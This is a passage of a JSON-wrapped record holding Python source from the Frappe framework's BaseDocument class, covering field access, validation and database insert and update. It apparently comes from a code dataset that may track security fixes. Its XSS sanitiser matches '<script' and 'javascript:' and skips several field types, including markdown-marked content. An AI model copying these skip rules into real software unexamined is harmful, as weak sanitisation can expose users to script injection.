\tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn out ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif 